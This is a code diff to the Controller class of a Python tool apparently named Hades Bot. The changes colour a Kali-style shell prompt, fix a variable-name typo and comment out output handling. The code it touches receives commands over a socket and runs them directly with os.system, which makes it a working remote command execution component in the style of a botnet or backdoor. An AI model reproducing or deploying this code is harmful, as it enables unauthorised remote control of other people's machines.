@@ -51,23 +51,25 @@ class Controller(object):
                     working_directory = os.getcwd()
                     if uid != 0:
                         host_format = '''
-┌──({host_name})-[{cwd}]
-└─$ '''.format(host_name=host,cwd=working_directory)
+{blue}┌──({host_name})-[{cwd}]
+{blue}└─$ {white}'''.format(host_name=host,cwd=working_directory,blue=Fore.BLUE,white=Fore.WHITE)
                     elif uid == 0:
                         host_format = '''
-┌──(root💀{host_name})-[{cwd}]
-└─#'''.format(host_name=host,cwd=working_directory)
+{red}┌──(root💀{host_name})-[{cwd}]
+{red}└─# {white}'''.format(host_name=host,cwd=working_directory,red=Fore.RED,white=Fore.WHITE)
                     cmd_read = client_socket.recv(buffer_size).decode()
                     print(host_format,end='')
-                    airbitrary_cmd_exec = os.system(cmd_read)
+                    arbitrary_cmd_exec = os.system(cmd_read)
                     bot_command = client_socket.send(bytes(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Hades Bot-Command: ",'utf-8') + cmd_read.encode())
-                    output = client_socket.recv(buffer_size).decode()
-                    results = output.split(SEPARATOR)
-                    print(results)
-
+                    #output = client_socket.recv(buffer_size).decode()
+                    #results = output.split(SEPARATOR)
+                    #client_socket.send(bytes(str(results),"utf-8"))
 
         except Exception as Err:
-            print(Err)
+            if Err == "int() argument must be a string, a bytes-like object or a number, not 'NoneType'":
+                print(f'{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]You cant leave the arguments empty.')
+            else:
+                print(f'{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Err}')
             print('\nUsage for help: python3 <hades-bot.py> -h \n')
 
     @staticmethod
